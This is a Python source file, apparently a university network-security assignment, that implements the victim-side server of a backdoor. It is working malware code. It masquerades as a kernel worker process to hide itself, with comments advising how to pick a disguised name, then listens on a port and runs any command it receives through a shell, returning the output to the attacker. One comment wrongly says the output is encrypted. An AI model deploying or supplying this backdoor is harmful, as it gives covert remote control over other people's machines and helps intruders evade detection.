#!/usr/bin/python
'''
COMP 8505 - Assignment 3
Backdoor - Server (Victim) by Jeffrey Sasaki

The server program will execute a command given by the client (attacker) and
outputs the response back to the client.
'''
import socket
import base64
import os
import subprocess
import optparse
import sys
import setproctitle

# masquerade process title
# NOTE: generally a backdoor would not be named "backdoor" a recommended process
# title would be something like "[kworker/0:0H]" or
# "/usr/bin/systemd/systemd-login"
title = "[kworker/5:0]"
setproctitle.setproctitle(title)

# parse command line argument
# generally any output would be concealed on the server (victim's) side
parser = optparse.OptionParser("usage: python server.py -p <port>")
parser.add_option('-p', dest='port', type = 'int', help = 'port')
(options, args) = parser.parse_args()
if (options.port == None):
	print parser.usage
	sys.exit()
else:
	port = options.port

# listen for client
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', port))
c.listen(1)
s, a = c.accept()
s.send('You are connected')

while True:
	data = s.recv(1024)

	# check for "exit" by the attacker
	if data == "exit":
		break    	

	# execute command
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdoutput = proc.stdout.read() + proc.stderr.read()

	# send encrypted output
	s.send(stdoutput)
s.close()
sys.exit()
